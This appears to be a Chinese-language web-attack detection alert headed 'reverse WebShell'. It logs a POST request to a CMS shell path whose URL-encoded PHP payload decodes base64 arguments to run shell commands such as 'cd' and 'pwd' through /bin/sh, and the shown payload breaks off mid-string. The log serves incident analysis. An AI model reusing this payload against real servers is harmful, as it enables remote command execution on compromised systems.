反弹WebShell

**Web应用威胁检测-疑似成功的Web攻击**

```shell
请求时间: 2020-09-09 18:08:36
攻击者IP: x.x.x.x
Host: x.x.x.x:8080
URI: /cms/p/shell
Content_type: application/x-www-form-urlencoded
POST_DATA: qaf2c1ebc16d34=L2Jpbi9zaA%3D%3D&r1df44c3406006=Y2QgIi9zaXRlL2lmX2FkbWluL3B1YmxpYyI7dztlY2hvIFtTXTtwd2Q7ZWNobyBbRV0%3D&sb=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%22b2dbd97%22%3Becho%20%40asenc(%24output)%3Becho%20%2213b7eaf%22%3B%7Dob_start()%3Btry%7B%24p%3Dbase64_decode(%24_POST%5B%22qaf2c1ebc16d34%22%5D)%3B%24s%3Dbase64_decode(%24_POST%5B%22r1df44c3406006%22%5D)%3B%24envstr%3D%40base64_decode(%24_POST%5B%22va2a6f4efc0528%22%5D)%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24c%3Dsubstr(%24d%2C0%2C1)%3D%3D%22%2F%22%3F%22-c%20%5C%22%7B%24s%7D%5C%22%22%3A%22%2Fc%20%5C%22%7B%24s%7D%5C%22%22%3Bif(substr(%24d%2C0%2C1)%3D%3D%22%2F%22)%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3A%2Fusr%2Flocal%2Fsbin%3A%2Fusr%2Flocal%2Fbin%3A%2Fusr%2Fsbin%3A%2Fusr%2Fbin%3A%2Fsbin%3A%2Fbin%22)%3B%7Delse%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3BC%3A%2FWindows%2Fsystem32%3BC%3A%2FWindows%2FSysWOW64%3BC%3A%2FWindows%3BC%3A%2FWindows%2FSystem32%2FWindowsPowerShell%2Fv1.0%2F%3B%22)%3B%7Dif(!empty(%24envstr))%7B%24envarr%3Dexplode(%22%7C%7C%7Casline%7C%7C%7C%2

```

